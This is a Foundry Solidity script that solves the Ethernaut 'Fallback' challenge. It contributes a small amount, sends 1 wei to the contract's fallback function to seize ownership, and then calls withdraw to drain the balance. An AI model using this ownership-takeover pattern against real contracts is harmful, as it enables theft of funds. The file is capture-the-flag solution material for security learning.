// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/01_Fallback.sol";

contract ExploitScript is Script {
    
    Fallback level1 = Fallback(payable(0x27d96f33A5668B3447F21a08223bc5a42dfE697c));

    function run() public {
        vm.startBroadcast();
        
        level1.owner();
        level1.contributions(level1.owner());
        level1.contribute{value:0.0001 ether}();
        address(level1).call{value:1 wei}("");
        level1.owner();
        level1.withdraw();
        
        vm.stopBroadcast();
    }
}